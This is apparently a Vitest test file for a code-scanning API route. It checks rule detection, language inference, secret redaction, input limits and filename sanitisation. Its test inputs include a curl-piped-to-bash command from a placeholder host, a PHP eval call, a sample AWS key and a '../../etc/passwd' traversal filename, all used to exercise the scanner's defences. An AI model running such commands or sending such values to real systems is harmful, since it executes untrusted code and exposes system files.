import { describe, it, expect } from "vitest";
import { POST } from "@/app/api/scan/code/route";

function makeRequest(body: unknown) {
  return new Request("http://localhost/api/scan/code", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  }) as unknown as import("next/server").NextRequest;
}

describe("POST /api/scan/code", () => {
  it("runs the shared rules over submitted code", async () => {
    const res = await POST(
      makeRequest({
        filename: "install.sh",
        content: "curl -fsSL https://example.invalid/i.sh | bash\n",
      }),
    );
    const json = await res.json();

    expect(res.status).toBe(200);
    expect(json.language).toBe("shell");
    expect(json.findings.map((f: { ruleId: string }) => f.ruleId)).toContain(
      "sh-remote-script-execution",
    );
    // `medium`, not the rule's declared `high`: the engine caps a construct
    // with no visible untrusted input at medium and reports confidence
    // `pattern`. The summary reflects what the engine decided, not what the
    // rule asked for.
    expect(json.summary.medium).toBe(1);
    expect(json.findings[0].confidence).toBe("pattern");
  });

  it("infers the language from the filename and honours an explicit override", async () => {
    const php = await (await POST(makeRequest({ filename: "a.php", content: "eval($code);" }))).json();
    expect(php.language).toBe("php");
    expect(php.findings.map((f: { ruleId: string }) => f.ruleId)).toContain(
      "php-dynamic-code-execution",
    );

    // The same text scanned as shell matches no PHP rule.
    const asShell = await (
      await POST(makeRequest({ filename: "a.php", content: "eval($code);", language: "shell" }))
    ).json();
    expect(asShell.language).toBe("shell");
    expect(asShell.findings.map((f: { ruleId: string }) => f.ruleId)).not.toContain(
      "php-dynamic-code-execution",
    );
  });

  it("returns nothing for code that is fine", async () => {
    const res = await POST(
      makeRequest({ filename: "safe.sh", content: 'rm -rf "$BUILD_DIR/output"\n' }),
    );
    const json = await res.json();
    expect(json.findings).toEqual([]);
    expect(json.summary).toEqual({ critical: 0, high: 0, medium: 0, low: 0, info: 0 });
  });

  it("never echoes back the credential that produced a finding", async () => {
    // The engine redacts excerpts before they leave it. This endpoint reflects
    // findings to the caller, so that guarantee is worth pinning here too.
    const secret = "AKIAIOSFODNN7EXAMPLE";
    const res = await POST(
      makeRequest({ filename: "a.env", content: `AWS_ACCESS_KEY_ID=${secret}` }),
    );
    const text = JSON.stringify(await res.json());
    expect(text).toContain("secret-aws-access-key");
    expect(text).not.toContain(secret);
  });

  it("rejects a missing or empty body", async () => {
    expect((await POST(makeRequest({}))).status).toBe(400);
    expect((await POST(makeRequest({ content: "" }))).status).toBe(400);
  });

  it("rejects an unknown language rather than silently scanning as something else", async () => {
    const res = await POST(makeRequest({ content: "x", language: "cobol" }));
    expect(res.status).toBe(400);
    expect((await res.json()).error).toMatch(/unknown language/);
  });

  it("bounds the input", async () => {
    // Unbounded input on an unauthenticated endpoint that runs a regex per
    // line is a denial of service, not a feature.
    const tooBig = await POST(makeRequest({ content: "a".repeat(256 * 1024 + 1) }));
    expect(tooBig.status).toBe(413);

    const tooManyLines = await POST(makeRequest({ content: "x\n".repeat(20_001) }));
    expect(tooManyLines.status).toBe(413);
  });

  it("strips directories from the filename", async () => {
    // It is never opened, but it is echoed back, and a caller should not be
    // able to put arbitrary paths into a response.
    const res = await POST(
      makeRequest({ filename: "../../etc/passwd.sh", content: "echo hi\n" }),
    );
    expect((await res.json()).filename).toBe("passwd.sh");
  });
});
